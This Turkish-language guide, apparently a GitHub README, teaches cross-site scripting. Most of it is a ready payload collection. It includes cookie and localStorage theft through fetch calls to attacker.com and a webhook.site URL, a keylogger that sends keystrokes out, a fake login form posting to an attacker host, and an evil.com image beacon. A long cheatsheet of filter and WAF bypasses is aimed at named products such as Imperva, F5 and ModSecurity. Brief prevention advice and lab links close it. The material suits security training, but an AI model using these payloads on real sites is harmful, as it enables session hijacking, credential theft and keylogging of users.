# XSS (Cross-Site Scripting) Rehberi (2025)

## 📑 İçerik
- [Giriş](#-giriş)
- [XSS Türleri](#-xss-türleri)
- [Temel Payload'lar](#-temel-payloadlar)
- [Eski / Çalışma İhtimali Düşük Payload'lar](#-eski--çalışma-ihtimali-düşük-payloadlar)
- [WAF Bypass Payload'ları](#-waf-bypass-payloadları)
- [Tespit Yöntemleri](#-tespit-yöntemleri)
- [XSS ile Olası Saldırı Senaryoları](#-xss-ile-olası-saldırı-senaryoları)
- [İleri Seviye Payloadlar & WAF Bypass Teknikleri](#ileri-seviye-payloadlar--waf-bypass-teknikleri)
- [Önleme Yöntemleri](#-önleme-yöntemleri)
- [Test Ortamları](#-test-ortamları)
- [Kaynaklar](#-kaynaklar)

---

## 🎯 Giriş
XSS (Cross-Site Scripting), web uygulamalarında sıkça karşılaşılan bir güvenlik açığıdır.  
Saldırganlar hedef kullanıcının tarayıcısında zararlı JavaScript kodu çalıştırarak:
- Oturum çalabilir
- Kullanıcıyı yönlendirebilir
- Keylogger veya phishing sayfa ekleyebilir

---

## 🧩 XSS Türleri
### 1. Stored XSS (Kalıcı XSS)
- Zararlı kod sunucuya/veritabanına kaydedilir.
- Kullanıcı her sayfayı açtığında çalışır.

### 2. Reflected XSS (Yansıtılmış XSS)
- Zararlı kod URL parametresinde gelir.
- Yanıtta direkt olarak çalışır.

### 3. DOM-Based XSS
- Açık tamamen tarayıcı tarafında, DOM manipülasyonu ile oluşur.
- Sunucuya istek gitmeden tetiklenir.

---

## 💻 Temel Payload'lar
| Payload | Açıklama | Çalışma Durumu |
|---------|----------|----------------|
| `<script>alert('XSS')</script>` | Basit alert ile XSS doğrulama | ✅ |
| `<img src=x onerror=alert('XSS')>` | Hatalı resim yükleme ile XSS | ✅ |
| `<svg/onload=alert('XSS')>` | SVG onload olayı | ✅ |
| `"><script>alert('XSS')</script>` | HTML injection sonrası XSS | ✅ |
| `<body onload=alert('XSS')>` | Body yüklenince tetikleme | ✅ |
| `<script>alert(document.cookie)</script>` | Cookie bilgisi görüntüleme | ⚠️ (HTTPOnly varsa çalışmaz) |
| `<script>alert(document.domain)</script>` | Domain görüntüleme | ✅ |
| `<script>fetch('https://attacker.com?c='+document.cookie)</script>` | Cookie dışarı gönderme | ⚠️ |
| `<script>document.location='https://attacker.com?c='+document.cookie</script>` | Yönlendirme ile çalma | ⚠️ |

---

## 🕰️ Eski / Çalışma İhtimali Düşük Payload'lar
| Payload | Açıklama | Çalışma Durumu |
|---------|----------|----------------|
| `<a href="javascript:alert('XSS')">Tıkla</a>` | javascript: URI ile XSS | ❌ |
| `<iframe src="javascript:alert('XSS')">` | iframe + javascript | ❌ |
| `<img src="javascript:alert('XSS')">` | Eski tarayıcılarda çalışır | ❌ |
| `<style>@import 'javascript:alert("XSS")';</style>` | CSS import ile XSS | ❌ |
| `<embed src="javascript:alert('XSS')">` | embed ile XSS | ❌ |
| `<object data="javascript:alert('XSS')">` | object ile XSS | ❌ |
| `document.domain='malicious.com';` | Domain değiştirme | ⚠️ (Aynı eTLD+1 içinde) |

---

## 🛡️ WAF Bypass Payload'ları
| Payload | Açıklama | Çalışma Durumu |
|---------|----------|----------------|
| `&#60;script&#62;alert(1)&#60;/script&#62;` | HTML entity encoding | ⚠️ |
| `<script>alert(String.fromCharCode(88,83,83))</script>` | ASCII kod ile | ⚠️ |
| `<script>eval('al'+'ert(1)')</script>` | Kod parçalama | ⚠️ |
| `<script>eval(atob('YWxlcnQoMSk='))</script>` | Base64 decode | ⚠️ |
| `<img src=1 onerror=alert(1)>` | Event handler kullanımı | ✅ |
| `<a href=# onmouseover=alert(1)>Hover</a>` | Mouse hover tetiklemesi | ✅ |

---

## 🔍 Tespit Yöntemleri
- Test payload’ları ile form alanlarını kontrol et.
- **OWASP ZAP**, **Burp Suite** gibi araçlarla tarama yap.
- Filtrelenmemiş kullanıcı girdisini HTML/JS çıktısında ara.
- DOM tabanlı XSS için kaynak kod analizi yap.

---
## 🚨 XSS ile Olası Saldırı Senaryoları

### 1. Cookie Çalma
```html
<script>
fetch("https://webhook.site/ac2a452b-4f51-4762-82c5-6d0c6ecf6bdc?data=" + document.cookie);
</script>

<script>
fetch('https://ctf-platform.com/catch?flag=' + document.cookie);
</script>
```
⚠️ Not: HTTPOnly cookie’ler JavaScript ile okunamaz.

---

### 2. LocalStorage / SessionStorage Çalma
```html
<script>
fetch('https://attacker.com/log?ls=' + JSON.stringify(localStorage));
</script>
```

---

### 3. CSRF Tetikleme
```html
<script>
fetch("https://hedefsite.com/transfer?amount=1000&to=attacker", {credentials: "include"});
</script>
```

---

### 4. Keylogger Yerleştirme
```html
<script>
document.addEventListener('keydown', e => {
  fetch('https://attacker.com/keys?key=' + e.key);
});
</script>
```

---

### 5. Phishing / Fake Login Form
```html
<form action="https://attacker.com/steal" method="POST">
  <input name="username" placeholder="Kullanıcı Adı">
  <input type="password" name="password" placeholder="Şifre">
  <input type="submit" value="Giriş">
</form>
```

---

### 6. Kullanıcı Yönlendirme
```html
<script>
window.location = "https://attacker.com";
</script>
```

---

### 7. Kurban Adına İşlem Yapma
```html
<script>
fetch('/api/sendMessage', {
  method: 'POST',
  credentials: 'include',
  body: JSON.stringify({msg: 'Merhaba!'}),
  headers: {'Content-Type': 'application/json'}
});
</script>
```


## 🚨 İleri Seviye Payloadlar & WAF Bypass Teknikleri

Cross-Site Scripting (XSS) Cheatsheet
--------------------------------------------------------------------
XSS Locators:
'';!--"<XSS>=&{()}
--------------------------------------------------------------------
Classic Payloads:
<svg onload=alert(1)>
"><svg onload=alert(1)>
<iframe src="javascript:alert(1)">
"><script src=data:&comma;alert(1)//
--------------------------------------------------------------------
script tag filter bypass:
<svg/onload=alert(1)>
<script>alert(1)</script>
<script     >alert(1)</script>
<ScRipT>alert(1)</sCriPt>
<%00script>alert(1)</script>
<script>al%00ert(1)</script>
--------------------------------------------------------------------
HTML tags:
<img/src=x a='' onerror=alert(1)>
<IMG """><SCRIPT>alert(1)</SCRIPT>">
<img src=`x`onerror=alert(1)>
<img src='/' onerror='alert("kalisa")'>
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<BODY ONLOAD=alert('XSS')>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<SCRIPT SRC=http:/evil.com/xss.js?< B >
"><XSS<test accesskey=x onclick=alert(1)//test
<svg><discard onbegin=alert(1)>
<script>image = new Image(); image.src="https://evil.com/?c="+document.cookie;</script>
<script>image = new Image(); image.src="http://"+document.cookie+"evil.com/";</script>
--------------------------------------------------------------------
Other tags:
<BASE HREF="javascript:alert('XSS');//">
<DIV STYLE="width: expression(alert('XSS'));">
<TABLE BACKGROUND="javascript:alert('XSS')">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<xss id=x tabindex=1 onactivate=alert(1)></xss>
<xss onclick="alert(1)">test</xss>
<xss onmousedown="alert(1)">test</xss>
<body onresize=alert(1)>”onload=this.style.width=‘100px’>
<xss id=x onfocus=alert(document.cookie)tabindex=1>#x’;</script>
--------------------------------------------------------------------CharCode:
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
--------------------------------------------------------------------
if the input is already in script tag:
@domain.com">user+'-alert`1`-'@domain.com
--------------------------------------------------------------------AngularJS: 




toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,11 4,116,40,49,41)
--------------------------------------------------------------------
Scriptless:
<link rel=icon href="//evil?
<iframe src="//evil?
<iframe src="//evil?
<input type=hidden type=image src="//evil?
--------------------------------------------------------------------
Unclosed Tags:
<svg onload=alert(1)//
--------------------------------------------------------------------
DOM XSS:
“><svg onload=alert(1)>
<img src=1 onerror=alert(1)>
javascript:alert(document.cookie)
\“-alert(1)}//
<><img src=1 onerror=alert(1)>
--------------------------------------------------------------------
Another case:
param=abc`;return+false});});alert`xss`;</script>
abc`; Finish the string
return+false}); Finish the jQuery click function
}); Finish the jQuery ready function
alert`xss`; Here we can execute our code
</script> This closes the script tag to prevent JavaScript parsing errors
--------------------------------------------------------------------
Restrictions Bypass
--------------------------------------------------------------------
No parentheses:
<script>onerror=alert;throw 1</script>
<script>throw onerror=eval,'=alert\x281\x29'</script>
<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
<script>location='javascript:alert\x281\x29'</script>
<script>alert`1`</script>
<script>new Function`X${document.location.hash.substr`1`}`</script>
--------------------------------------------------------------------
No parentheses and no semicolons:
<script>{onerror=alert}throw 1</script>
<script>throw onerror=alert,1</script>
<script>onerror=alert;throw 1337</script>
<script>{onerror=alert}throw 1337</script>
<script>throw onerror=alert,'some string',123,'haha'</script>
--------------------------------------------------------------------
No parentheses and no spaces:
<script>Function`X${document.location.hash.substr`1`}```</script>
--------------------------------------------------------------------
Angle brackets HTML encoded (in an attribute):
“onmouseover=“alert(1)
‘-alert(1)-’
--------------------------------------------------------------------
If quote is escaped:
‘}alert(1);{‘
‘}alert(1)%0A{‘
\’}alert(1);{//
--------------------------------------------------------------------
Embedded tab, newline, carriage return to break up XSS:
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
--------------------------------------------------------------------
Other:
<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>: base64 value which is alert(‘XSS’)
--------------------------------------------------------------------
Encoding
--------------------------------------------------------------------
Unicode:
<script>\u0061lert(1)</script>
<script>\u{61}lert(1)</script>
<script>\u{0000000061}lert(1)</script>
--------------------------------------------------------------------
Hex:
<script>eval('\x61lert(1)')</script>
--------------------------------------------------------------------
HTML:
<svg><script>&#97;lert(1)</script></svg>
<svg><script>&#x61;lert(1)</script></svg>
<svg><script>alert&NewLine;(1)</script></svg>
<svg><script>x="&quot;,alert(1)//";</script></svg>
\’-alert(1)//
--------------------------------------------------------------------
URL:
<a href="javascript:x='%27-alert(1)-%27';">XSS</a>
--------------------------------------------------------------------
Double URL Encode:
%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
--------------------------------------------------------------------
Unicode + HTML:
<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>
--------------------------------------------------------------------
HTML + URL:
<iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe>
--------------------------------------------------------------------
WAF Bypass
--------------------------------------------------------------------
Imperva Incapsula:
%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%25 23x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%25 26%2523x29%3B%22%3E
<img/src="x"/onerror="[JS-F**K Payload]">
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';><img/src=q onerror='new Function`al\ert\`1\``'>
--------------------------------------------------------------------WebKnight:
<details ontoggle=alert(1)>
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
--------------------------------------------------------------------
F5 Big IP:
<body style="height:1000px" onwheel="[DATA]">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
<body style="height:1000px" onwheel="[JS-F**k Payload]">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[JS-F**k Payload]">
<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
--------------------------------------------------------------------Barracuda WAF:
<body style="height:1000px" onwheel="alert(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
--------------------------------------------------------------------
PHP-IDS:
<svg+onload=+"[DATA]"
<svg+onload=+"aler%25%37%34(1)"
--------------------------------------------------------------------
Mod-Security:
<a href="j[785 bytes of (&NewLine;&Tab;)]avascript:alert(1);">XSS</a>
1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
--------------------------------------------------------------------
Quick Defense:
<input type="search" onsearch="aler\u0074(1)">
<details ontoggle="aler\u0074(1)">
--------------------------------------------------------------------
Sucuri WAF:
1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4


## 🛡️ Önleme Yöntemleri
1. **Girdi Doğrulama**
   - Whitelist yaklaşımı kullan.
2. **Çıktı Kodlama**
   - Context-based encoding (`<`, `>`, `&` vb.)
3. **HTTPOnly Cookie**
   - JavaScript erişimini engeller.
4. **Content Security Policy (CSP)**
   - Sadece belirli kaynaklardan script çalışmasına izin ver.
   - **Nonce/Hash Örneği:**
```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self' 'nonce-abc123'">
<script nonce="abc123">alert('Güvenli script')</script>
```
- DOMPurify gibi kütüphaneler ile HTML temizleme.

---

## 🧪 Test Ortamları
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/cross-site-scripting)
- [HackTheBox](https://www.hackthebox.com)
- [TryHackMe XSS Labs](https://tryhackme.com)

---

## 📚 Kaynaklar

### Resmi Belgeler
- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)

### Payload Listeleri
- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [SecLists - XSS](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS)
- [PayloadBox - XSS Payload List](https://github.com/payloadbox/xss-payload-list)
- [AwesomeXSS](https://github.com/s0md3v/AwesomeXSS)

### Araştırma Yazıları
- [pgaijin66/XSS-Payloads](https://github.com/pgaijin66/XSS-Payloads)
